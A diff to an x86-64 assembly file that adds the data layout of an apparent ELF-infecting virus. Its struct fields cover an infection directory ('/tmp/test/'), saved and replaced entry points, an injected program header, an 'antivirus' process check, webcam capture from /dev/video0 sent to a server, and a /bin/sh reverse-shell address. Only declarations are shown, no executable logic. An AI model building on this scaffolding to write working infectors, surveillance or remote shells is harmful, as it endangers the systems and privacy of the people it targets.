@@ -73,6 +73,102 @@
 
 ; STRUCTURES
 ; https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779
+
+
+
+
+
+
+struc mydata
+    .file_size           resq 1
+    .file                resb 13  ; 'elf64 found!' + '\0'
+
+    .signature           resb 86  ; longueur à adapter à ta chaîne
+    .encryption_key      resq 1
+
+    .old_entry           resq 1
+    .new_entry           resq 1
+    .self                resb 15  ; '/proc/self/exe' + '\0'
+    .last                resb 3   ; '..' + '\0'
+    .curr                resb 2   ; '.' + '\0'
+    .cap_type            resd 1
+    .pathv               resb 12  ; '/dev/video0' + '\0'
+    .one                 resb 1
+    .zero                resb 1
+    .paddi               resq 1
+    .entry               resq 1
+    .exec                resd 1
+    .urandom_path        resb 13  ; '/dev/urandom' + '\0'
+    .randbuf             resq 1
+
+    .proc_prefix         resb 7   ; '/proc/' + '\0'
+    .comm_path           resb 6   ; '/comm' + '\0'
+    .forbidden_process   resb 10  ; 'antivirus' + '\0'
+
+    .serv_addr_video:
+    .serv_addr_video_af  resw 1
+    .serv_addr_video_port resw 1
+    .serv_addr_video_ip  resd 1
+    .serv_addr_video_pad resb 8
+
+    .serv_addr:
+    .serv_addr_af        resw 1
+    .serv_addr_port      resw 1
+    .serv_addr_ip        resd 1
+    .serv_addr_pad       resb 8
+
+    .shell               resb 8   ; '/bin/sh' + '\0'
+    .arg0                resb 3   ; 'sh' + '\0'
+    .argv                resq 2
+
+    .templates_rdi       resb 28
+    .templates_rax       resb 28
+    .templates_rsi       resb 28
+    .templates_rdx       resb 28
+    .templates_rcx       resb 28
+    .templates_r10       resb 28
+    .templates_r11       resb 28
+    .templates_r13       resb 28
+    .templates_r15       resb 28
+
+    .dynm                resb 1
+    .inte                resb 1
+    .ispie               resb 1
+
+    .new_programheader:
+    .p_type              resd 1
+    .p_flags             resd 1
+    .p_offset            resq 1
+    .p_vaddr             resq 1
+    .p_paddr             resq 1
+    .p_filez             resq 1
+    .p_memsz             resq 1
+    .p_palign            resq 1
+
+    .newl                resb 1   ; 0xa
+    .path                resb 11  ; '/tmp/test/' + '\0'
+
+    ; buffer_bss
+    .padd                resb 4096
+    .buff                resb 4096
+    .stack               resb 144 ;
+    .elfp0               resb 56
+    .elfp1               resb 56
+
+    .buf_addrs           resq NBUF
+    .buf_sizes           resq NBUF
+    .reqb                resb 16
+    .v4buf               resb 88
+
+    .path_buffer         resb 256
+    .comm_buff           resb 32
+    .temp_buf            resb 8
+    .time_buf            resb 8
+    .timeval             resb 16
+endstruc
+
+
+
 struc dirent
 .d_ino resb 8
 .d_off resb 8
@@ -80,6 +176,7 @@ struc dirent
 .d_type resb 1
 .d_name resb 8
 endstruc
+
 
 struc ehdr
 .e_ident        resb 16       ;    /* File identification. */
